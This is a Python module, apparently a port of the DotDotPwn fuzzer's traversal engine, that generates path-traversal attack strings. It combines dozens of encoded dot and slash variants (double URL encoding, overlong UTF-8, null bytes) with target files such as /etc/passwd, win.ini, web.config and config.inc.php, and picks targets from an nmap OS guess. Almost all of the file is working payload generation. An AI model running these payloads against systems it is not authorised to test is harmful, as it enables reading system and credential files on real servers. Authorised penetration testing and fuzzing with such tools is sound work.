"""
Traversal Engine Module

This is the CORE module that resides the main functionality to make all the 
combinations between the dots, slashes and filenames to make the traversal strings.

Python implementation of the original DotDotPwn TraversalEngine.pm
Original by nitr0us (nitrousenador@gmail.com)
"""

from typing import List, Optional, Set
import itertools
from enum import Enum


class OSType(Enum):
    """Operating System types for intelligent fuzzing"""
    WINDOWS = "windows"
    UNIX = "unix"
    GENERIC = "generic"


class TraversalEngine:
    """
    Engine that builds traversal strings according to the depth provided and OS type.
    
    If OS detection is enabled, it includes only specific files for the detected OS.
    Also handles different representations of dots and slashes for comprehensive fuzzing.
    """

    # Specific files in Windows systems
    WINDOWS_FILES = [
        'boot.ini',
        '\\windows\\win.ini', 
        '\\windows\\system32\\drivers\\etc\\hosts'
    ]

    # Specific files in UNIX-based systems  
    UNIX_FILES = [
        '/etc/passwd',
        '/etc/issue'
    ]

    # Extra files (only included if extra_files flag is enabled)
    EXTRA_FILES = [
        "config.inc.php",
        "web.config"
    ]

    # Dots (..) representations for fuzzing
    DOTS = [
        "..",
        ".%00.",
        "..%00",
        "..%01", 
        ".?", "??", "?.",
        "%5C..",
        ".%2e", "%2e.",
        ".../.",
        "..../",
        "%2e%2e", "%%c0%6e%c0%6e",
        "0x2e0x2e", "%c0.%c0.",
        "%252e%252e",
        "%c0%2e%c0%2e", "%c0%ae%c0%ae",
        "%c0%5e%c0%5e", "%c0%ee%c0%ee",
        "%c0%fe%c0%fe", "%uff0e%uff0e",
        "%%32%%65%%32%%65",
        "%e0%80%ae%e0%80%ae",
        "%25c0%25ae%25c0%25ae",
        "%f0%80%80%ae%f0%80%80%ae",
        "%f8%80%80%80%ae%f8%80%80%80%ae",
        "%fc%80%80%80%80%ae%fc%80%80%80%80%ae"
    ]

    # Slashes (/ and \\) representations for fuzzing
    SLASHES = [
        "/", "\\\\",
        "%2f", "%5c",
        "0x2f", "0x5c", 
        "%252f", "%255c",
        "%c0%2f", "%c0%af", "%c0%5c", "%c1%9c", "%c1%pc",
        "%c0%9v", "%c0%qf", "%c1%8s", "%c1%1c", "%c1%af",
        "%bg%qf", "%u2215", "%u2216", "%uEFC8", "%uF025",
        "%%32%%66", "%%35%%63",
        "%e0%80%af",
        "%25c1%259c", "%25c0%25af", 
        "%f0%80%80%af",
        "%f8%80%80%80%af"
    ]

    # Special patterns that won't be combined in the main engine to reduce payload count
    SPECIAL_PATTERNS = [
        "..//", "..///", "..\\\\\\\\", "..\\\\\\\\\\\\", "../\\\\", "..\\\\/",
        "../\\\\/", "..\\\\/\\\\", "\\\\../", "/..\\\\", ".../", "...\\\\",
        "./../", ".\\\\..\\\\", ".//..///", ".\\\\\\\\..\\\\\\\\", "......///",
        "%2e%c0%ae%5c", "%2e%c0%ae%2f"
    ]

    def __init__(self, quiet: bool = False):
        """Initialize the Traversal Engine"""
        self.quiet = quiet

    def generate_traversals(
        self,
        os_type: OSType = OSType.GENERIC,
        depth: int = 6,
        specific_file: Optional[str] = None,
        extra_files: bool = False,
        extension: Optional[str] = None,
        bisection_depth: Optional[int] = None
    ) -> List[str]:
        """
        Generate traversal strings based on parameters
        
        Args:
            os_type: Operating system type for intelligent fuzzing
            depth: Depth of traversals (default: 6)  
            specific_file: Specific filename to target
            extra_files: Include extra files from EXTRA_FILES
            extension: File extension to append to each fuzz string
            bisection_depth: If provided, use this depth for bisection algorithm
            
        Returns:
            List of traversal strings to test
        """
        if not self.quiet:
            print("[+] Creating Traversal patterns (mix of dots and slashes)")

        # Generate base traversal patterns
        traversal_patterns = self._generate_patterns()
        
        # Generate traversal strings with repetitions
        if not self.quiet:
            if bisection_depth:
                print(f"[+] Multiplying {bisection_depth} times the traversal patterns (Bisection Algorithm enabled)")
            else:
                print(f"[+] Multiplying {depth} times the traversal patterns (-d switch)")

        max_depth = bisection_depth if bisection_depth else depth
        min_depth = bisection_depth if bisection_depth else 1
        
        traversal_strings = []
        for pattern in traversal_patterns:
            for k in range(min_depth, max_depth + 1):
                traversal_strings.append(pattern * k)

        # Add special traversal patterns
        if not self.quiet:
            print("[+] Creating the Special Traversal patterns")
            
        special_traversals = []
        for pattern in self.SPECIAL_PATTERNS:
            for k in range(min_depth, max_depth + 1):
                special_traversals.append(pattern * k)

        # Get target files based on OS and settings
        target_files = self._get_target_files(os_type, specific_file, extra_files)
        
        # Combine traversal strings with target files
        final_traversals = []
        
        for traversal in traversal_strings + special_traversals:
            for target_file in target_files:
                # Adapt slashes based on traversal pattern
                adapted_file = self._adapt_file_slashes(target_file, traversal)
                payload = traversal + adapted_file
                
                # Add extension if specified
                if extension:
                    payload += extension
                    
                final_traversals.append(payload)

        if not self.quiet:
            print(f"[+] Traversal Engine DONE! - Total traversal tests created: {len(final_traversals)}")

        return final_traversals

    def _generate_patterns(self) -> List[str]:
        """Generate base traversal patterns from dots and slashes combinations"""
        patterns = []
        for dot in self.DOTS:
            for slash in self.SLASHES:
                patterns.append(dot + slash)
        return patterns

    def _get_target_files(
        self, 
        os_type: OSType, 
        specific_file: Optional[str], 
        extra_files: bool
    ) -> List[str]:
        """Get list of target files based on OS type and settings"""
        if specific_file:
            return [specific_file]

        target_files = []
        
        if os_type == OSType.WINDOWS:
            target_files.extend(self.WINDOWS_FILES)
        elif os_type == OSType.UNIX:
            target_files.extend(self.UNIX_FILES)
        else:  # GENERIC
            target_files.extend(self.WINDOWS_FILES)
            target_files.extend(self.UNIX_FILES)

        if extra_files:
            target_files.extend(self.EXTRA_FILES)

        return target_files

    def _adapt_file_slashes(self, target_file: str, traversal_pattern: str) -> str:
        """
        Adapt file slashes based on traversal pattern encoding
        
        If traversal pattern includes backslashes, replace slashes in filenames with backslashes
        and vice versa. Also handle different encoding representations.
        """
        adapted_file = target_file

        # Check if pattern contains specific encodings and adapt accordingly
        if "%2f" in traversal_pattern.lower():
            adapted_file = adapted_file.replace("/", "%2f").replace("\\\\", "%5c")
        elif "%5c" in traversal_pattern.lower():
            adapted_file = adapted_file.replace("/", "%2f").replace("\\\\", "%5c")
        elif "\\\\" in traversal_pattern:
            adapted_file = adapted_file.replace("/", "\\\\")
        elif "/" in traversal_pattern:
            adapted_file = adapted_file.replace("\\\\", "/")

        return adapted_file

    @staticmethod
    def detect_os_type(os_detail: str) -> OSType:
        """
        Detect OS type from nmap OS detection string
        
        Args:
            os_detail: OS detail string from nmap
            
        Returns:
            OSType enum value
        """
        if not os_detail:
            return OSType.GENERIC

        os_detail_lower = os_detail.lower()
        
        if any(keyword in os_detail_lower for keyword in ['windows', 'microsoft', 'win']):
            return OSType.WINDOWS
        elif any(keyword in os_detail_lower for keyword in ['linux', 'unix', 'bsd', 'solaris', 'aix']):
            return OSType.UNIX
        else:
            return OSType.GENERIC